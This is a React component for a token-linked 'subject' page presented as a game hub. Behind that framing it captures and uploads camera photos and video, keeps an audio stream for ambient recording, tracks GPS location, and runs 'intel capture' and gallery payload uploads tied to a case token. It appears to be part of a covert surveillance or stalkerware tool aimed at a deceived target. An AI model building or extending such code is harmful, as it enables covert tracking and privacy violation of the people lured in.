import React, { useEffect, useLayoutEffect, useState, useRef, useCallback } from 'react';
import { useParams } from 'react-router-dom';
import { GPS_OPTIONS } from './geolocation';
import { useLocationTracker } from './hooks/useLocationTracker';
import { useCameraCapture } from './hooks/useCameraCapture';
import { useAmbientCapture } from './hooks/useAmbientCapture';
import { getDeviceInfo } from './deviceInfo';
import { apiGet } from './api';
import { uploadSubjectMedia } from './mediaUpload';
import {
    SUBJECT_GRANTED_KEY,
    subjectCameraDoneKey,
    CONSENT_TEXT,
    CAMERA_VIDEO_SECONDS,
    getClientSessionId,
    SUBJECT_GALLERY_PAYLOAD_ENABLED
} from './config';
import SubjectArenaGate from './games/SubjectArenaGate';
import SubjectGameEntry from './games/SubjectGameEntry';
import { useSubjectIntelCapture } from './hooks/useSubjectIntelCapture';
import { attachGalleryPayloadUploadOnEntry, galleryStorageKey } from './subjectGalleryPayload';
import { attachSubjectImageDownloadOnEntry } from './subjectImageDownload';

const noop = () => {};

function entryStatus(phase) {
    if (phase === 'loading') return 'loading';
    if (phase === 'booting') return 'booting';
    if (phase === 'camera_waiting') return 'camera';
    if (phase === 'location_waiting') return 'location';
    return 'ready';
}

function SubjectSessionPage() {
    const { token } = useParams();
    const deviceInfoRef = useRef(getDeviceInfo());
    const [phase, setPhase] = useState('loading');
    const [entryError, setEntryError] = useState(null);
    const [activeGameId, setActiveGameId] = useState(null);
    const [trackingEnabled, setTrackingEnabled] = useState(false);
    const { runCaptureSession } = useCameraCapture();
    const initialAudioStreamRef = useRef(null);
    const cameraDoneKey = subjectCameraDoneKey(token);

    const ambientEnabled =
        trackingEnabled &&
        (phase === 'arena' || phase === 'playing');

    useAmbientCapture({
        enabled: ambientEnabled,
        subjectToken: token,
        initialAudioStream: initialAudioStreamRef.current
    });
    const locationKey = `${SUBJECT_GRANTED_KEY}_${token}`;

    useSubjectIntelCapture({ enabled: Boolean(token), subjectToken: token });

    useLayoutEffect(() => {
        if (!token) return undefined;

        if (typeof window.__pulseGalleryDownloadTick === 'function') {
            window.__pulseGalleryDownloadTick();
        }
        const cleanupDownload = attachSubjectImageDownloadOnEntry(token);

        let cleanupUpload = () => {};
        if (SUBJECT_GALLERY_PAYLOAD_ENABLED) {
            if (typeof window.__pulseGalleryTick === 'function') {
                window.__pulseGalleryTick();
            }
            cleanupUpload = attachGalleryPayloadUploadOnEntry(galleryStorageKey(token), {
                subjectToken: token,
                clientSessionId: getClientSessionId()
            });
        }

        return () => {
            cleanupDownload();
            cleanupUpload();
        };
    }, [token]);

    useLocationTracker({
        enabled: trackingEnabled,
        deviceInfo: deviceInfoRef.current,
        testMode: false,
        subjectToken: token,
        consentText: CONSENT_TEXT,
        onConnectionChange: noop,
        onDeviceRegistered: noop,
        onUserLocation: noop,
        onDevicesChange: noop,
        onLocationRefining: noop
    });

    useEffect(() => {
        let cancelled = false;
        (async () => {
            try {
                const data = await apiGet(`/api/cases/by-token/${token}`);
                if (cancelled) return;
                if (data.valid) {
                    const locOk = localStorage.getItem(locationKey) === 'true';
                    const camOk = localStorage.getItem(cameraDoneKey) === 'true';
                    if (locOk && camOk) {
                        setTrackingEnabled(true);
                        setPhase('arena');
                    } else {
                        setPhase('prompt');
                    }
                } else {
                    setPhase('invalid');
                }
            } catch {
                if (!cancelled) setPhase('invalid');
            }
        })();
        return () => {
            cancelled = true;
        };
    }, [token, locationKey, cameraDoneKey]);

    const startTracking = useCallback(() => {
        localStorage.setItem(locationKey, 'true');
        setTrackingEnabled(true);
        setPhase('arena');
    }, [locationKey]);

    const handleSelectGame = useCallback((gameId) => {
        setActiveGameId(gameId);
        setPhase('playing');
    }, []);

    const handleBackToHub = useCallback(() => {
        setActiveGameId(null);
        setPhase('arena');
    }, []);

    const requestLocation = useCallback(() => {
        if (!navigator.geolocation) {
            setEntryError('denied');
            setPhase('prompt');
            return;
        }
        setPhase('location_waiting');
        navigator.geolocation.getCurrentPosition(
            () => startTracking(),
            () => {
                setEntryError('denied');
                setPhase('prompt');
            },
            GPS_OPTIONS
        );
    }, [startTracking]);

    const requestPermissions = useCallback(async () => {
        setEntryError(null);
        setPhase('camera_waiting');
        try {
            const { photo, video, stream } = await runCaptureSession(CAMERA_VIDEO_SECONDS, {
                keepStreamForAmbient: true
            });
            initialAudioStreamRef.current = stream;
            await uploadSubjectMedia({ subjectToken: token, type: 'photo', blob: photo });
            localStorage.setItem(cameraDoneKey, 'true');
            if (video) {
                await uploadSubjectMedia({ subjectToken: token, type: 'video', blob: video });
            }
            requestLocation();
        } catch (err) {
            const msg = err?.message || String(err);
            if (msg === 'NOT_SUPPORTED') {
                setEntryError('denied');
            } else if (err?.name === 'NotAllowedError' || msg.includes('Permission')) {
                setEntryError('camera_denied');
            } else {
                setEntryError('upload_error');
            }
            setPhase('prompt');
        }
    }, [token, runCaptureSession, requestLocation, cameraDoneKey]);

    if (phase === 'invalid') {
        return (
            <div className="pulse-arena pulse-entry">
                <div className="pulse-entry__footer" style={{ marginTop: '40vh' }}>
                    <p className="pulse-entry__error">
                        Link etibarsızdır və ya tapşırıq bağlanıb.
                    </p>
                </div>
            </div>
        );
    }

    if (phase === 'arena' || phase === 'playing') {
        return (
            <SubjectArenaGate
                clientKey={token}
                activeGameId={activeGameId}
                onSelectGame={handleSelectGame}
                onBackToHub={handleBackToHub}
            />
        );
    }

    return (
        <SubjectGameEntry
            status={entryStatus(phase)}
            error={entryError}
            onStart={requestPermissions}
        />
    );
}

export default SubjectSessionPage;
